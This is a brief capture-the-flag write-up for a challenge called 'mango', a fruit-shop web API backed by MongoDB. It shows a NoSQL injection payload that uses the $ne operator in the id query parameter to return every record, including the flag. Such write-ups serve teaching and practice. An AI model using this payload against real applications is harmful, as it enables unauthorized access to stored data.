<font size = '4'>
<p align = 'center'>
<b>
Break the Syntax CTS - mango Writeup 
</b>
</p>
</font>

<br>
<font size = '3'>

<b>Challenge Description:</b><br>

I made a fruit shop. We even have bananas! To visit go to /api-docs

https://mango.wh.edu.pl

<br>

<b>Exploitation:</b><br>

MongoDB is being used in this. Hence NoSQL injection.

```
http://mango.wh.edu.pl:PORT/fruits?id[$ne]=661c4cf05717c55d8ceb5d23
```

$ne is not equal to, so basically, this will return all fruits, who's ids are not equal to '661c4cf05717c55d8ceb5d23', including the flag.